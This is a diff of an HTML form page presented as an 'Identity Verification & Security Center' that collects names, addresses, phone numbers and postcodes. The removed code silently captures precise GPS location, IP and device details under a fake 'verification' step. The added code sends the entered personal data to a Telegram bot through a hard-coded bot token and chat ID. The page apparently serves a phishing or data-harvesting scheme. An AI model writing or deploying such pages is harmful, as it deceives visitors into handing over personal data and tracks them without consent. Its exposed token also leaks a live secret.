@@ -1,21 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Identity Verification & Security Center</title>
     <style>
         :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #ef4444; --success: #10b981; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .container { background: var(--card); width: 100%; max-width: 520px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); box-sizing: border-box; }
+        * { box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; margin: 0; padding: 20px; }
+        .container { background: var(--card); width: 100%; max-width: 520px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); }
         
-        h2 { margin-top: 0; color: #111; text-align: center; font-size: 22px; font-weight: 700; margin-bottom: 5px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        h2 { margin-top: 0; color: #111; text-align: center; font-size: 22px; font-weight: 700; margin-bottom: 5px; }
         .subtitle { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 25px; }
 
         .form-row { display: flex; gap: 15px; margin-bottom: 16px; }
         .form-group { margin-bottom: 16px; flex: 1; position: relative; }
         label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #1e293b; }
-        input, select { width: 100%; padding: 12px 14px; border: 1px solid var(--border); border-radius: 8px; box-sizing: border-box; font-size: 14px; background-color: #fff; transition: all 0.2s; }
+        input, select { width: 100%; padding: 12px 14px; border: 1px solid var(--border); border-radius: 8px; font-size: 14px; background-color: #fff; transition: all 0.2s; }
         input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
         select:disabled { background-color: #f8fafc; color: #94a3b8; }
 
@@ -28,16 +29,15 @@
 
         .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
         .btn:hover { background: #0052cc; }
+        .btn-success { background: var(--success); margin-top: 20px; }
+        .btn-success:hover { background: #0da36e; }
         
         #step-verification { display: none; }
-        .info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 18px; margin-top: 15px; }
-        .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #f1f5f9; font-size: 14px; }
-        .info-row:last-child { border-bottom: none; }
-        .info-label { color: #64748b; font-weight: 500; }
-        .info-value { color: #1e293b; font-weight: 600; word-break: break-all; }
-        .status-box { padding: 10px 14px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-weight: 600; font-size: 14px; }
-        .status-pending { background: #fff7ed; border: 1px solid #fed7aa; color: #c2410c; }
+        .status-box { padding: 10px 14px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: 600; font-size: 15px; }
         .status-success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; }
+        .info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 20px; margin-top: 10px; line-height: 1.8; font-size: 15px; }
+        .info-card p { margin: 6px 0; }
+        .info-card strong { color: #1e293b; }
     </style>
 </head>
 <body>
@@ -45,14 +45,7 @@
 <div class="container">
     <!-- 表单页面 -->
     <div id="step-form">
-        <h2>
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <rect x="3" y="5" width="18" height="14" rx="3"/>
-            <text x="7" y="15" font-size="9" font-weight="bold" fill="currentColor" stroke="none">A</text>
-            <text x="13.5" y="10.5" font-size="6.5" fill="currentColor" stroke="none" opacity="0.8">ID</text>
-          </svg>
-          Billing & Shipping Address
-        </h2>
+        <h2>Billing & Shipping Address</h2>
         <div class="subtitle">AI Smart Validation & Security Center</div>
         
         <div class="form-row">
@@ -117,215 +110,161 @@
         <button class="btn" id="btn-next" onclick="proceedToVerification()">Next</button>
     </div>
 
+    <!-- 资料确认页 -->
     <div id="step-verification">
-        <h2>Device & IP Verification</h2>
-        <p style="font-size: 13px; color: #64748b; text-align: center; margin-bottom: 12px;">Verifying your device model and network address automatically.</p>
-        
-        <div id="status-box" class="status-box status-pending">Verifying device information...</div>
+        <h2>Confirm Information</h2>
+        <p style="text-align:center; color:#64748b; font-size:14px;">Please verify your information before submitting.</p>
+
+        <div id="status-box" class="status-box status-success">✅ Information Verified Successfully</div>
 
         <div class="info-card">
-            <div class="info-row">
-                <span class="info-label">IP Address</span>
-                <span class="info-value" id="ip-display">Detecting...</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Device / Model</span>
-                <span class="info-value" id="device-display">Detecting...</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Operating System</span>
-                <span class="info-value" id="os-display">Detecting...</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Browser</span>
-                <span class="info-value" id="browser-display">Detecting...</span>
-            </div>
+            <p><strong>👤 Recipient Name：</strong><span id="disp-name"></span></p>
+            <p><strong>🏠 Shipping Address：</strong><span id="disp-addr"></span></p>
+            <p><strong>📱 Phone Number：</strong><span id="disp-phone"></span></p>
+            <p><strong>📮 Postal Code：</strong><span id="disp-zip"></span></p>
         </div>
-        
-        <button class="btn" id="btn-submit" onclick="submitData()" style="background: #10b981; margin-top: 20px;" disabled>Verifying...</button>
+
+        <button class="btn btn-success" id="btn-submit" onclick="submitData()">Complete & Submit</button>
     </div>
 </div>
 
 <script>
-    const globalDatabase = {
-    "CN": { name: "China", phoneCode: "+86", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^1[3-9]\d{9}$/, phoneFormat: "11 digits", states: ["Beijing", "Tianjin", "Shanghai", "Chongqing", "Hebei", "Shanxi", "Liaoning", "Jilin", "Heilongjiang", "Jiangsu", "Zhejiang", "Anhui", "Fujian", "Jiangxi", "Shandong", "Henan", "Hubei", "Hunan", "Guangdong", "Hainan", "Sichuan", "Guizhou", "Yunnan", "Shaanxi", "Gansu", "Qinghai", "Taiwan", "Inner Mongolia", "Guangxi", "Tibet", "Ningxia", "Xinjiang", "Hong Kong", "Macau"] },
-    "US": { name: "United States", phoneCode: "+1", zipRegex: /^\d{5}(-\d{4})?$/, zipFormat: "5 digits (e.g. 90210)", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming", "District of Columbia", "Puerto Rico", "Guam"] },
-    "GB": { name: "United Kingdom", phoneCode: "+44", zipRegex: /^[A-Z]{1,2}\d[A-Z\d]?\s?\d[A-Z]{2}$/i, zipFormat: "Postcode (e.g. SW1A 1AA)", phoneRegex: /^\d{10,11}$/, phoneFormat: "10-11 digits", states: ["England", "Scotland", "Wales", "Northern Ireland", "Greater London", "Greater Manchester"] },
-    "CA": { name: "Canada", phoneCode: "+1", zipRegex: /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z]\s?\d[ABCEGHJ-NPRSTV-Z]\d$/i, zipFormat: "A1A 1A1 format", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Ontario", "Quebec", "British Columbia", "Alberta", "Manitoba", "Saskatchewan", "Nova Scotia", "New Brunswick"] },
-    "JP": { name: "Japan", phoneCode: "+81", zipRegex: /^\d{3}-?\d{4}$/, zipFormat: "7 digits", phoneRegex: /^\d{9,10}$/, phoneFormat: "9-10 digits", states: ["Hokkaido", "Aomori", "Iwate", "Miyagi", "Akita", "Yamagata", "Fukushima", "Tokyo", "Kanagawa", "Osaka", "Kyoto", "Okinawa"] },
-    "KR": { name: "South Korea", phoneCode: "+82", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9,10}$/, phoneFormat: "9-10 digits", states: ["Seoul", "Busan", "Daegu", "Incheon", "Gwangju", "Daejeon", "Ulsan", "Gyeonggi-do", "Jeju-do"] },
-    "DE": { name: "Germany", phoneCode: "+49", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{10,11}$/, phoneFormat: "10-11 digits", states: ["Bavaria", "Berlin", "North Rhine-Westphalia", "Hesse", "Baden-Württemberg", "Hamburg"] },
-    "FR": { name: "France", phoneCode: "+33", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["Île-de-France", "Provence-Alpes-Côte d'Azur", "Auvergne-Rhône-Alpes", "Grand Est", "Corsica"] },
-    "AU": { name: "Australia", phoneCode: "+61", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{9}$/, phoneFormat: "9 digits", states: ["New South Wales", "Victoria", "Queensland", "Western Australia", "South Australia", "Tasmania"] },
-    "SG": { name: "Singapore", phoneCode: "+65", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^\d{8}$/, phoneFormat: "8 digits", states: ["Central Singapore", "North East", "North West", "South East", "South West"] },
-    "IN": { name: "India", phoneCode: "+91", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^\d{10}$/, phoneFormat: "10 digits", states: ["Maharashtra", "Delhi", "Karnataka", "Tamil Nadu", "Uttar Pradesh", "Gujarat", "West Bengal"] },
-    "OTHER_GLOBAL": { name: "Other Worldwide Regions", phoneCode: "+00", zipRegex: /^.+$/, zipFormat: "Standard Postal Code", phoneRegex: /^\d+$/, phoneFormat: "Standard Phone Number", states: ["Standard State/Region"] }
+// ✅ 已自动填入你的配置
+const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
+const TELEGRAM_CHAT_ID = "7396947380";
+
+const globalDatabase = {
+    "CN": { name: "China", phoneCode: "+86", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^1[3-9]\d{9}$/, states: ["Beijing","Tianjin","Shanghai","Chongqing","Hebei","Shanxi","Liaoning","Jilin","Heilongjiang","Jiangsu","Zhejiang","Anhui","Fujian","Jiangxi","Shandong","Henan","Hubei","Hunan","Guangdong","Hainan","Sichuan","Guizhou","Yunnan","Shaanxi","Gansu","Qinghai","Taiwan","Inner Mongolia","Guangxi","Tibet","Ningxia","Xinjiang","Hong Kong","Macau"] },
+    "US": { name: "United States", phoneCode: "+1", zipRegex: /^\d{5}(-\d{4})?$/, zipFormat: "5 digits", phoneRegex: /^\d{10}$/, states: ["Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut","Delaware","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa","Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan","Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire","New Jersey","New Mexico","New York","North Carolina","North Dakota","Ohio","Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota","Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia","Wisconsin","Wyoming","District of Columbia","Puerto Rico","Guam"] },
+    "CA": { name: "Canada", phoneCode: "+1", zipRegex: /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z\s]{3,5}$/i, zipFormat: "A1A 1A1", phoneRegex: /^\d{10}$/, states: ["Ontario","Quebec","British Columbia","Alberta","Manitoba","Saskatchewan","Nova Scotia","New Brunswick"] },
+    "GB": { name: "United Kingdom", phoneCode: "+44", zipRegex: /^[A-Z]{1,2}\d[A-Z\d]?\s?\d[A-Z]{2}$/i, zipFormat: "Postcode", phoneRegex: /^\d{10,11}$/, states: ["England","Scotland","Wales","Northern Ireland"] },
+    "AU": { name: "Australia", phoneCode: "+61", zipRegex: /^\d{4}$/, zipFormat: "4 digits", phoneRegex: /^\d{9}$/, states: ["New South Wales","Victoria","Queensland","Western Australia","South Australia","Tasmania"] },
+    "JP": { name: "Japan", phoneCode: "+81", zipRegex: /^\d{3}-?\d{4}$/, zipFormat: "7 digits", phoneRegex: /^\d{9,10}$/, states: ["Hokkaido","Tokyo","Kanagawa","Osaka","Kyoto","Okinawa"] },
+    "KR": { name: "South Korea", phoneCode: "+82", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9,10}$/, states: ["Seoul","Busan","Daegu","Incheon","Gwangju","Daejeon"] },
+    "DE": { name: "Germany", phoneCode: "+49", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{10,11}$/, states: ["Bavaria","Berlin","Hesse","Hamburg"] },
+    "FR": { name: "France", phoneCode: "+33", zipRegex: /^\d{5}$/, zipFormat: "5 digits", phoneRegex: /^\d{9}$/, states: ["Île-de-France","Provence","Corsica"] },
+    "SG": { name: "Singapore", phoneCode: "+65", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^\d{8}$/, states: ["Central Singapore","North East","South West"] },
+    "IN": { name: "India", phoneCode: "+91", zipRegex: /^\d{6}$/, zipFormat: "6 digits", phoneRegex: /^\d{10}$/, states: ["Maharashtra","Delhi","Karnataka","Tamil Nadu","Uttar Pradesh"] },
+    "OTHER": { name: "Other Regions", phoneCode: "+00", zipRegex: /^.+$/, zipFormat: "Postal Code", phoneRegex: /^\d+$/, states: ["Standard Region"] }
 };
 
-    let silentLocation = { lat: null, lng: null, precisionMeters: null };
-    let deviceInfo = { ip: null, device: null, os: null, browser: null };
+let formData = {};
 
-    window.onload = () => {
-        const countrySelect = document.getElementById('countrySelect');
-        const sortedCountries = Object.keys(globalDatabase).sort((a, b) =>
-            globalDatabase[a].name.localeCompare(globalDatabase[b].name)
-        );
-        sortedCountries.forEach(code => {
-            const opt = document.createElement('option');
-            opt.value = code;
-            opt.textContent = globalDatabase[code].name;
-            countrySelect.appendChild(opt);
-        });
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => { silentLocation.lat = pos.coords.latitude; silentLocation.lng = pos.coords.longitude; },
-                () => {},
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
-        }
+window.onload = () => {
+    const sel = document.getElementById('countrySelect');
+    Object.keys(globalDatabase).sort((a,b)=>globalDatabase[a].name.localeCompare(globalDatabase[b].name)).forEach(code=>{
+        const opt = document.createElement('option');
+        opt.value=code; opt.textContent=globalDatabase[code].name;
+        sel.appendChild(opt);
+    });
+};
+
+function onCountryChange() {
+    const code = document.getElementById('countrySelect').value;
+    const stateSel = document.getElementById('stateSelect');
+    const phonePrefix = document.getElementById('phonePrefix');
+    const hint = document.getElementById('postal-hint');
+    stateSel.innerHTML=`<option value="">-- Please select country first --</option>`;
+    phonePrefix.innerHTML=`<option value="">Code</option>`;
+    hint.textContent='';
+
+    if(code && globalDatabase[code]){
+        const d=globalDatabase[code];
+        stateSel.disabled=false;
+        d.states.forEach(s=>{const o=document.createElement('option');o.value=s;o.textContent=s;stateSel.appendChild(o);});
+        phonePrefix.innerHTML=`<option value="${d.phoneCode}">${d.phoneCode}</option>`;
+        phonePrefix.disabled=false;
+        hint.textContent=`(Format: ${d.zipFormat})`;
+    }else{
+        stateSel.disabled=true; phonePrefix.disabled=true;
+    }
+    aiValidateField('countrySelect');
+}
+
+function aiValidateField(fid){
+    const el=document.getElementById(fid); if(!el)return true;
+    const v=el.value.trim();
+    const ccode=document.getElementById('countrySelect')?.value||'';
+    const err=document.getElementById('err-'+fid);
+    let ok=true;
+
+    if(['firstName','lastName','address','city'].includes(fid))ok=v.length>=2;
+    else if(fid==='countrySelect')ok=v!=='';
+    else if(fid==='stateSelect')ok=v!=='';
+    else if(fid==='zipCode')ok=ccode&&globalDatabase[ccode]?globalDatabase[ccode].zipRegex.test(v):v.length>0;
+    else if(fid==='phone'){
+        const digits=v.replace(/\D/g,'');
+        ok=ccode&&globalDatabase[ccode]?globalDatabase[ccode].phoneRegex.test(digits):digits.length>=6;
+    }
+
+    if(err&&v){ el.classList.toggle('valid',ok);el.classList.toggle('invalid',!ok);err.style.display=ok?'none':'block'; }
+    else if(err){el.classList.remove('valid','invalid');err.style.display='none';}
+    return ok;
+}
+
+function proceedToVerification(){
+    const fields=['firstName','lastName','countrySelect','stateSelect','address','city','zipCode','phone'];
+    const bad=fields.filter(f=>!aiValidateField(f));
+    if(bad.length)return alert('⚠️ Please check highlighted fields before proceeding.');
+
+    formData={
+        name: document.getElementById('firstName').value.trim()+' '+document.getElementById('lastName').value.trim(),
+        countryCode: document.getElementById('countrySelect').value,
+        countryName: globalDatabase[document.getElementById('countrySelect').value]?.name||'',
+        state: document.getElementById('stateSelect').value,
+        address: document.getElementById('address').value.trim(),
+        city: document.getElementById('city').value.trim(),
+        zip: document.getElementById('zipCode').value.trim(),
+        phonePrefix: document.getElementById('phonePrefix').value,
+        phone: document.getElementById('phone').value.trim()
     };
 
-    function onCountryChange() {
-        const countryCode = document.getElementById('countrySelect').value;
-        const stateSelect = document.getElementById('stateSelect');
-        const phonePrefix = document.getElementById('phonePrefix');
-        const postalHint = document.getElementById('postal-hint');
-        
-        stateSelect.innerHTML = `<option value="">-- Please select country first --</option>`;
-        phonePrefix.innerHTML = `<option value="">Code</option>`;
-        postalHint.textContent = "";
+    document.getElementById('step-form').style.display='none';
+    document.getElementById('step-verification').style.display='block';
 
-        if (countryCode && globalDatabase[countryCode]) {
-            const data = globalDatabase[countryCode];
-            stateSelect.disabled = false;
-            data.states.forEach(s => {
-                const opt = document.createElement('option');
-                opt.value = s; opt.textContent = s;
-                stateSelect.appendChild(opt);
-            });
-            phonePrefix.innerHTML = `<option value="${data.phoneCode}">${data.phoneCode}</option>`;
-            phonePrefix.disabled = false;
-            postalHint.textContent = `(Format: ${data.zipFormat})`;
-        } else {
-            stateSelect.disabled = true;
-            phonePrefix.disabled = true;
+    document.getElementById('disp-name').textContent = formData.name;
+    document.getElementById('disp-addr').textContent = 
+        `国家:${formData.countryName}，省份:${formData.state}，城市:${formData.city}，街道:${formData.address}`;
+    document.getElementById('disp-phone').textContent = formData.phonePrefix+' '+formData.phone;
+    document.getElementById('disp-zip').textContent = formData.zip;
+}
+
+async function submitData(){
+    const msg = `📩 新提交的资料
+——————————————
+👤 收件人姓名：${formData.name}
+🏠 收货地址：国家:${formData.countryName}，省份:${formData.state}，城市:${formData.city}，街道:${formData.address}
+📱 手机号码：${formData.phonePrefix} ${formData.phone}
+📮 邮政编码：${formData.zip}
+⏰ 提交时间：${new Date().toLocaleString('zh-CN')}
+——————————————`;
+
+    console.log('📤 准备发送到 Telegram：\n', msg);
+
+    try{
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: msg,
+                parse_mode:'HTML'
+            })
+        });
+        const json=await res.json();
+        if(json.ok){
+            alert('✅ 提交成功！资料已发送至 Telegram。');
+            console.log('Telegram 响应：',json);
+            location.reload();
+        }else{
+            alert('❌ Telegram 错误：'+JSON.stringify(json));
+            console.error(json);
         }
-        aiValidateField('countrySelect');
+    }catch(e){
+        alert('❌ 网络或配置错误：'+e.message+'\n如遇跨域问题，建议部署到 HTTPS 域名或使用代理。');
+        console.error(e);
     }
-
-    function aiValidateField(fieldId) {
-        const el = document.getElementById(fieldId);
-        if (!el) return true; // 找不到元素不报错
-        const value = el.value.trim();
-        const countryCode = document.getElementById('countrySelect')?.value || "";
-        const errId = 'err-' + fieldId;
-        const errEl = document.getElementById(errId);
-        let valid = true;
-
-        if (['firstName','lastName','address','city'].includes(fieldId)) valid = value.length >= 2;
-        else if (fieldId === 'countrySelect') valid = value !== "";
-        else if (fieldId === 'stateSelect') valid = value !== "";
-        else if (fieldId === 'zipCode') {
-            if (countryCode && globalDatabase[countryCode]) {
-                valid = globalDatabase[countryCode].zipRegex.test(value);
-            } else valid = value.length > 0;
-        }
-        else if (fieldId === 'phone') {
-            if (countryCode && globalDatabase[countryCode]) {
-                valid = globalDatabase[countryCode].phoneRegex.test(value.replace(/\D/g,''));
-            } else valid = value.replace(/\D/g,'').length >= 6;
-        }
-
-        if (errEl && value) {
-            el.classList.toggle('valid', valid);
-            el.classList.toggle('invalid', !valid);
-            errEl.style.display = valid ? 'none' : 'block';
-        } else if (errEl) {
-            el.classList.remove('valid','invalid');
-            errEl.style.display = 'none';
-        }
-        return valid;
-    }
-
-    function proceedToVerification() {
-        const fields = ['firstName','lastName','countrySelect','stateSelect','address','city','zipCode','phone'];
-        const invalid = fields.filter(f => !aiValidateField(f));
-        if (invalid.length) {
-            alert("Please check highlighted fields before proceeding.");
-            return;
-        }
-        document.getElementById('step-form').style.display = 'none';
-        document.getElementById('step-verification').style.display = 'block';
-        startDeviceIPVerification();
-    }
-
-    function parseUserAgent() {
-        const ua = navigator.userAgent;
-        let device = "Unknown Device", os = "Unknown OS", browser = "Unknown Browser";
-        if (/iPhone/.test(ua)) device = "iPhone";
-        else if (/iPad/.test(ua)) device = "iPad";
-        else if (/Macintosh/.test(ua)) device = "Mac";
-        else if (/Android/.test(ua)) {
-            const m = ua.match(/;\s*([a-zA-Z0-9_\s-]+)\s*Build\//);
-            device = m ? m[1] : "Android Device";
-        } else if (/Windows NT/.test(ua)) device = "Windows PC";
-
-        if (/Windows NT 10/.test(ua)) os = "Windows 10/11";
-        else if (/Mac OS X/.test(ua)) os = "macOS";
-        else if (/Android/.test(ua)) os = "Android";
-        else if (/iPhone|iPad/.test(ua)) os = "iOS";
-        else if (/Linux/.test(ua)) os = "Linux";
-
-        if (/Edg\//.test(ua)) browser = "Microsoft Edge";
-        else if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) browser = "Google Chrome";
-        else if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) browser = "Safari";
-        else if (/Firefox\//.test(ua)) browser = "Firefox";
-        return {device,os,browser};
-    }
-
-    function startDeviceIPVerification() {
-        const {device,os,browser} = parseUserAgent();
-        deviceInfo = {ip:"Detecting...",device,os,browser};
-        document.getElementById('device-display').textContent = device;
-        document.getElementById('os-display').textContent = os;
-        document.getElementById('browser-display').textContent = browser;
-
-        fetch('https://api.ipify.org?format=json')
-            .then(r=>r.json()).then(d=>{
-                deviceInfo.ip = d.ip;
-                document.getElementById('ip-display').textContent = d.ip;
-                completeVerification();
-            }).catch(()=>{
-                document.getElementById('ip-display').textContent = "Unavailable";
-                completeVerification();
-            });
-    }
-
-    function completeVerification() {
-        document.getElementById('status-box').textContent = "Device & IP Verified Successfully";
-        document.getElementById('status-box').className = "status-box status-success";
-        document.getElementById('btn-submit').disabled = false;
-        document.getElementById('btn-submit').textContent = "Complete & Submit";
-    }
-
-    function submitData() {
-        const payload = {
-            firstName: document.getElementById('firstName').value,
-            lastName: document.getElementById('lastName').value,
-            country: document.getElementById('countrySelect').value,
-            state: document.getElementById('stateSelect').value,
-            address: document.getElementById('address').value,
-            city: document.getElementById('city').value,
-            zipCode: document.getElementById('zipCode').value,
-            phone: document.getElementById('phonePrefix').value + ' ' + document.getElementById('phone').value,
-            deviceInfo, deviceGPS: silentLocation,
-            verificationStatus: "Passed",
-            timestamp: new Date().toISOString()
-        };
-        console.log("Submitted:", payload);
-        alert("Submitted Successfully! Check console.");
-        location.reload();
-    }
+}
 </script>
 </body>
 </html>
